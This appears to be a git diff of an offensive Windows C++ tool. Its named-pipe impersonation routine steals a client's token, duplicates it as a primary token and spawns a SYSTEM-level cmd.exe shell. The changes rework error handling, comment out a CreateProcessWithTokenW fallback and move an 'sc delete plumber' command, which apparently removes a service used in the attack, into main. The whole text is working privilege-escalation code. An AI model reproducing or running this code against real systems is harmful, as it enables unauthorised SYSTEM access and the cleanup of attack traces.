@@ -23,7 +23,7 @@ using namespace std;
 //SID info: https://learn.microsoft.com/en-US/windows-server/identity/ad-ds/manage/understand-security-identifiers
 //lower our token integrity level example: https://kb.digital-detective.net/display/BF/Understanding+and+Working+in+Protected+Mode+Internet+Explorer
 
-void NamedPipeImpersonate()
+BOOL NamedPipeImpersonate()
 {
     printf("==============================================================================\n");
     printf("Before we continue setting up the pipe server to receive the client, make sure to place the named pipe client executable in the c:\\users\\public directory\n");
@@ -88,7 +88,8 @@ void NamedPipeImpersonate()
     }
     else
     {
-        printf("error: %i\n", GetLastError());
+        printf("error impersonating the client: %i\n", GetLastError());
+        return false;
     }
 
     wchar_t command[] = L"C:\\Windows\\system32\\cmd.exe";
@@ -105,34 +106,39 @@ void NamedPipeImpersonate()
 
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
     {
-        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
-        goto cleanup;
+        printf("OpenThreadToken(). Error: %d\n", GetLastError());
+        return false;
     }
 
     if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
     {
-        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
-        goto cleanup;
+        printf("DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+        return false;
     }
    
 
     dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
-    BOOL bRet;
+    //https://stackoverflow.com/questions/58040954/how-to-launch-an-interactive-process-in-windows-on-java/58093917#58093917
+    //https://learn.microsoft.com/en-us/archive/blogs/alejacma/createprocessasuser-fails-with-error-5-access-denied-when-using-jobs
+
+    //BOOL bRet;
 
     if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
-        goto cleanup;
-
+    {
+        printf("error setting current directory: %d\n", GetLastError());
+        return false;
+    }
     if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
     {
         wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
-        goto cleanup;
+        return false;
     }
-
     if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
     {
         wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
-        goto cleanup;
+        return false;
     }
+
 
     ZeroMemory(&si, sizeof(STARTUPINFO));
     si.cb = sizeof(STARTUPINFO);
@@ -143,13 +149,38 @@ void NamedPipeImpersonate()
         printf("[+] successfully created a SYSTEM shell!!!\n");
         fflush(stdout);
         WaitForSingleObject(pi.hProcess, INFINITE);
+        if (hSystemToken)
+            CloseHandle(hSystemToken);
+        if (hSystemTokenDup)
+            CloseHandle(hSystemTokenDup);
+        if (pwszCurrentDirectory)
+            free(pwszCurrentDirectory);
+        if (lpEnvironment)
+            DestroyEnvironmentBlock(lpEnvironment);
+        if (pi.hProcess)
+            CloseHandle(pi.hProcess);
+        if (pi.hThread)
+            CloseHandle(pi.hThread);
+        return true;
     }
     else
     {
-        printf("[!] There was an error creating the SYSTEM shell using CreateProcessAsUser: %d\nTrying another method...", GetLastError());
-        fflush(stdout);
-        WaitForSingleObject(pi.hProcess, INFINITE);
+        printf("[!] There was an error creating the SYSTEM shell using CreateProcessAsUser - Error Code: %d\n", GetLastError());
+        if (hSystemToken)
+            CloseHandle(hSystemToken);
+        if (hSystemTokenDup)
+            CloseHandle(hSystemTokenDup);
+        if (pwszCurrentDirectory)
+            free(pwszCurrentDirectory);
+        if (lpEnvironment)
+            DestroyEnvironmentBlock(lpEnvironment);
+        if (pi.hProcess)
+            CloseHandle(pi.hProcess);
+        if (pi.hThread)
+            CloseHandle(pi.hThread);
+        return false;
     }
+    /*
     bRet = CreateProcessWithTokenW(hSystemTokenDup, NULL, NULL, command, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi);
 
     if (bRet == 0)
@@ -157,7 +188,7 @@ void NamedPipeImpersonate()
         printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
         printf("Return value: %d\n", GetLastError());
         fflush(stdout);
-        WaitForSingleObject(pi.hProcess, INFINITE);
+        return false;
     }
     else
     {
@@ -165,22 +196,12 @@ void NamedPipeImpersonate()
         printf("Return value: %d\n", bRet);
         fflush(stdout);
         WaitForSingleObject(pi.hProcess, INFINITE);
+        return true;
     }
-cleanup:
-    if (hSystemToken)
-        CloseHandle(hSystemToken);
-    if (hSystemTokenDup)
-        CloseHandle(hSystemTokenDup);
-    if (pwszCurrentDirectory)
-        free(pwszCurrentDirectory);
-    if (lpEnvironment)
-        DestroyEnvironmentBlock(lpEnvironment);
-    if (pi.hProcess)
-        CloseHandle(pi.hProcess);
-    if (pi.hThread)
-        CloseHandle(pi.hThread);
 
-    WinExec("cmd.exe /c sc delete plumber", 0);
+    */
+
+    //WinExec("cmd.exe /c sc delete plumber", 0);
     /* [Deprecated]
     if (HINSTANCE retVal3 = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc delete plumber", NULL, SW_HIDE))
     {
@@ -751,7 +772,8 @@ int main(int argc, char* argv[])
     }
     if (strcmp(argv[1], "-np") == 0)
     {
-        NamedPipeImpersonate();
+        bool piperet=NamedPipeImpersonate();
+        WinExec("cmd.exe /c sc delete plumber", 0);
         exit(0);
 
     }
